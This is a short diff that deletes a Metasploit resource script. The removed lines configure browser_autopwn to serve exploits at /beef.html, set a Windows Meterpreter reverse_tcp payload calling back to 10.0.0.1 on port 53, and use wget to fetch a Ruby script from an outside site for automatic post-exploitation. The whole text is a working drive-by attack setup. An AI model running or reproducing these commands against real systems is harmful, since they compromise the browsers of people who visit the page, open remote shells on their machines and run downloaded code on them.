@@ -1,9 +1,0 @@
-use auxiliary/server/browser_autopwn
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 10.0.0.1
-set LPORT 53
-set SRVPORT 9000
-set URIPATH /beef.html
-sh -c 'cd /tmp; wget http://spl0it.org/files/msfautopwn.rb'
-set AutoRunScript /tmp/msfautopwn.rb
-run
